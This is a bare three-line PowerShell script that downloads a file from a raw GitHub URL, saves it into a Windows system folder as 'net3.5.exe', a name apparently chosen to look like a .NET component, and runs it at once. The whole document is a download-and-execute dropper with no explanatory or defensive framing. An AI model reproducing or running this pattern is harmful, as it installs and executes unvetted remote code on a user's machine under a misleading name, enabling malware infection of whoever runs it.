$client = new-object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/net.js', 'C:\windows\system\net3.5.exe')
Start-Process -FilePath c:\\windows\\system\\net3.5.exe
